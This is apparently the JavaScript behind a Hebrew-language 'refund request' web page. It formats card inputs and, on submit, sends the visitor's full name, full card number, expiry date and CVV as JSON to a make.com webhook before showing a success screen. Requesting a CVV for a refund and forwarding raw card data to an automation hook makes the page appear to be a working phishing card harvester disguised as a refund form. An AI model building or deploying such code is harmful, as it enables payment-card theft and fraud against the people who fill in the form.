// Phase Navigation
function showPhase(phaseId) {
    document.querySelectorAll('.phase').forEach(p => p.classList.remove('active'));
    document.getElementById(phaseId).classList.add('active');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

document.getElementById('startRefundBtn').addEventListener('click', () => {
    showPhase('phase2');
});

document.getElementById('backToIntroBtn').addEventListener('click', () => {
    showPhase('phase1');
});

// Form Card Number Formatting
const cardInput = document.getElementById('cardNumber');
cardInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    let formattedValue = '';
    
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) {
            formattedValue += ' ';
        }
        formattedValue += value[i];
    }
    
    e.target.value = formattedValue.substring(0, 19);
});

// Expiry Date Formatting
const expiryInput = document.getElementById('expiryDate');
expiryInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    
    e.target.value = value.substring(0, 5);
});

// Form Submission
const refundForm = document.getElementById('refundForm');
refundForm.addEventListener('submit', (e) => {
    e.preventDefault();
    
    // Check required fields (native HTML validation check)
    if (!refundForm.checkValidity()) {
        refundForm.reportValidity();
        return;
    }
    
    const submitBtn = document.getElementById('submitBtn');
    const originalText = submitBtn.innerHTML;
    
    const refundAmount = document.getElementById('refundAmount').value;
    const fullName = document.getElementById('fullName').value;
    const cardNumber = document.getElementById('cardNumber').value;
    const expiryDate = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvv').value;

    const payload = {
        fullName,
        refundAmount,
        cardNumber,
        expiryDate,
        cvv,
        operationType: 'refund'
    };

    submitBtn.innerHTML = 'שולח...';
    submitBtn.disabled = true;

    fetch('https://hook.eu2.make.com/tgvsoc3m4m5n6pfhqv7bswtxm4nbxueg', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(response => {
        showPhase('phase3');
    })
    .catch(error => {
        console.error('Error:', error);
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
        alert('אירעה שגיאה בבקשת הזיכוי. נסו שוב.');
    });
});
